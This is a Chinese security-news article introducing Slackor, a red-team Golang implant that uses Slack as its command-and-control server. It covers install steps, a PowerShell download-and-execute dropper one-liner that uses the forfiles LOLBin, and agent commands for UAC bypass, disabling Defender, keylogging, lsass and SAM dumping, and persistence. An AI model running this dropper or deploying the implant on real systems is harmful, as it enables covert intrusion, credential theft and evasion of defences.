## Slackor

 **Slackor是一款Golang植入，它可以将Slack作为你的命令控制服务器。**

![](https://image.3001.net/images/20190723/1563893889_5d372081591de.png!small)

![](https://image.3001.net/images/20190723/1563893894_5d37208627e59.png!small)

注意：该工具目前仅处于概念验证模型阶段，请在创建任何Slack应用之前，确保应用符合Slack App开发者政策。

## 工具安装

Slackor服务器端采用Python 3开发，在使用该工具之前，你需要满足以下条件：

1、 一个Slack工作区；

2、 以下列权限注册一个App：

    
    
    channels:read
    
    channels:history
    
    channels:write
    
    files:write:user
    
    files:read

3、 创建一个BOT；

Slackor项目中包含五个文件：

    
    
    1、install.sh：安装依赖组件
    
    2、setup.py：这个脚本可以创建Slack信道、数据库和植入程序
    
    3、agent.py：这个脚本可以生成新的植入程序
    
    4、server.py：Slack服务器，可在Linux平台上运行
    
    5、agent.go：Golang植入程序
    
    6、requirements.txt：Python依赖（自动安装）

### 快速开始

    
    
    go get github.com/Coalfire-Research/Slackor
    
    cd $GOPATH/src/github.com/Coalfire-Research/Slackor

运行了上述命令之后，运行“install.sh”文件，然后运行“setup.py”，此时需要你提供Slack应用程序的“OAuth访问令牌”以及 “Bot
User OAuth访问令牌”。

成功运行上述脚本之后，还需要在项目的dist/目录中创建下列几个文件：

    
    
    agent.windows.exe:Windows 64-bit 代码
    
    agent.upx.exe:Windows 64-bit 代码, UPX 封装
    
    agent.darwin:macOS 64-bit 代码
    
    agent.32.linux:Linux 32-bit 代码
    
    agent.64.linux:Linux 64-bit 代码

在Linux主机上运行server.py之后，工具会根据目标主机的情况自动选择上述代理程序。

我们可以使用“stager”模块来生成一个one-liner或其他Dropper：

    
    
    powershell.exe iwr [URL] -o C:\Users\Public\[NAME].exe; forfiles.exe /p c:\windows\system32 /msvchost.exe /c C:\Users\Public\[NAME]; timeout 2; delC:\Users\Public\[NAME].exe

这条命令将会执行InvokeWebRequest(PS v.3+)来下载Payload，并使用一个[LOLBin](https://lolbas-project.github.io/lolbas/Binaries/Forfiles/)来执行它。执行完成后，Payload会进行自毁操作。这只是一个仅供参考的使用样例，大家可以根据自己的需要来使用其他的下载方法或执行方法。

## 工具使用

输入“help”或按下TAB键，我们就可以查看到该工具所支持的全部可用命令了，我们还可以输入“help [COMMAND]”来查看命令描述。

    
    
    (Slackor：服务器端)
    
    help –显示帮助菜单
    
    interact– 与代理端交互
    
    list –列出所有已注册的代理
    
    remove– 终止或移除代理
    
    revive– 向所有的代理发送重新注册信号
    
    stager– 生成一个One-Liner下载并执行植入程序
    
    quit –退出程序
    
    wipefiles– 删除Slack中的所有上传文件

当代理端就绪之后，我们就可以跟它进行交互了。使用“interact
[AGENT]”可以切换到代理端的命令行界面，然后输入“help”或按下TAB键即可查看代理端支持的所有可用命令。

(Slackor：代理端)

## 常用命令

    
    
    back –返回主菜单
    
    beacon– 修改代理确认时间间隔（默认为5秒）
    
    download– 从代理端下载文件至Slackor服务器
    
    help –显示帮助菜单
    
    kill –终止代理
    
    sleep– 代理休眠
    
    sysinfo– 显示当前用户、操作系统版本、系统架构和CPU核心数
    
    upload– 从代理端上传一份文件至Slackor 服务器
    
    wget –通过HTTP/HTTPS获取任意文件
    
    Windows命令
    
    bypassuac– 生成一个高完整性的代理
    
    cleanup– 移除持久性组件
    
    clipboard– 获取剪切板内容
    
    defanger– 尝试关闭WindowsDefender
    
    duplicate– 生成代理端副本
    
    getsystem-使用NTAUTHORITY/SYSTEM权限生成代理
    
    keyscan– 在代理端开启键盘记录器
    
    minidump–导出lsass.exe内存信息并下载
    
    persist– 在ADS中创建持久性植入程序
    
    samdump– 尝试导出SAM文件，以供离线提取哈希特征
    
    screenshot– 获取屏幕截图
    
    shellcode– 执行x64元Shellcode
    
    Linux命令
    
    screenshot- 获取屏幕截图

## OPSEC

命令输出和下载的文件都采用了AES加密，额外的还有Slack的TLS传输层加密。

在执行需要向磁盘写入数据的任务时，模块会给用户发送提醒。在执行Shell命令时，cmd.exe/bash将会被执行，这种行为可能会被目标主机监控到。下面给出的是一些OPSEC安全命令，它们不会执行cmd.exe/bash。

    
    
    cat –打印文件内容
    
    cd – 修改目录
    
    find –搜索目录文件名
    
    getip– 获取外部IP地址(发送一个DNS 请求)
    
    hostname– 显示主机名称
    
    ifconfig– 显示接口信息
    
    ls – 列举目录内容
    
    mkdir– 创建一个目录
    
    pwd –输出当前工作目录
    
    rm – 移除一个文件
    
    rmdir– 移除一个目录
    
    whoami/ getuid – 输出当前用户信息

## 项目地址

Slackor：【[GitHub传送门](https://github.com/Coalfire-Research/Slackor)】

 *** 参考来源：[Coalfire-Research](https://github.com/Coalfire-Research/Slackor)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

